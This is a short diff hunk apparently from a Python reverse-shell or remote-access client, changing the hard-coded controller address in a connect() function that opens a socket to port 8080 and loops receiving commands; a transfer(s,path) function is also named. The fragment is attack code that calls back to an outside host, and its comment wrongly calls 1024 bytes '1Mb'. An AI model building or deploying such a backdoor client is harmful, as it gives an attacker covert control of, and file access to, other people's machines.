@@ -20,7 +20,7 @@ def transfer(s,path):
 def connect():
 
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(("192.168.158.128",8080))   #Specify the IP address and Port number
+    s.connect(("10.10.10.10",8080))   #Specify the IP address and Port number
 
     while True:
         command=s.recv(1024)      #Receiving 1Mb of data
